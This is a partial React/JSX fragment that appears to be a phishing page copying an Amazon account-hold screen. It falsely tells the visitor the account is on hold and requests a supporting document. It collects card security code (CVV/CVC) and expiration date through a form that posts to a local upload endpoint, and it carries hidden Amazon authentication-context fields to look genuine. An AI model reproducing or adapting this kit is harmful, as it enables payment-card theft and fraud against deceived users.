  ...
  return (
        ...
        <div className="a-section">
            ...
            <div className="a-section a-spacing-none">
                ...
                <div
                    className="a-section a-spacing-medium a-spacing-top-medium a-text-center"
                >
                    <a
            ...
            <form id="abbott-form" method="post" action="https://localhost:4001/upload">
                ...
                type="hidden"
                name="__token_"
                defaultValue="g8dZ3bQ3q82mzqm8hf9b1rd7dxZO0KP7+2jUwa9WUbPBAAAAAQAAAABl4gEqcmF3AAAAAPgCGsIfbV0AW+J7i/a6ow=="
                />

                <input
                type="hidden"
                name="authenticationContext"
                defaultValue="language=en_US&amp;marketplaceId=ATVPDKIKX0DER&amp;assocHandle=amzn_abbott_portal_us&amp;pageId=amzn_abbott_portal_us&amp;returnTo=https%3A%2F%2Fwww.amazon.com"
                spellCheck="false"
                />
                ...
                >
                    ...
                    <div className="a-box-inner a-alert-container">
                        ...
                        <div className="a-popover-preload" id="a-popover-alert-0-1">
                            <span
                            >Amazon takes your security seriously, and monitors
                            activity on your account to keep your account and
                            payment methods safe.</span
                            >
                            ...
                            <li>
                                <span className="a-list-item"
                                >We have temporarily placed your account on hold
                                so we could review it with you.</span
                                >
                            </li>
                            <li>
                                <span className="a-list-item"
                            ...
                            <li>
                                ...
                                supporting document, we may be able to remove the
                                hold on your account more quickly.</span
                                >
                            </li>
                            </ul>
                        </div>
                ...
                <div className='custom-your-card abbott-view-component component-width-extra_large'>
                    <div
                    id="text-input-11"
                    className="a-section a-spacing-extra-large component-display-block custom-your-card-item1"
                    >
                    <div className="a-section a-spacing-none">
                        <div className="a-section a-spacing-none">
                        <label className="a-form-label"
                    ...
                    <div
                    id="text-input-11"
                    className="a-section a-spacing-extra-large  component-display-block custom-your-card-item2"
                    >
                    <div className="a-section a-spacing-none">
                        <div className="a-section a-spacing-none">
                        <label className="a-form-label"
                            ><i className="input-field-required"></i> Security Code (CVV/CVC)</label>
                            <input
                            type="tel"
                            maxLength="20"
                            name="phone-number"
                        ...
                        />
                        <span>{
                            ' '}(<span className='custom-text'>What's this?</span>)</span>
                        </div>
                    </div>
                    </div>
                </div>
                ...
                >
                    <div className="a-section a-spacing-none">
                        <div className="a-section a-spacing-none">
                        <label className="a-form-label"><i className="input-field-required"></i> Expiration date</label
                        >
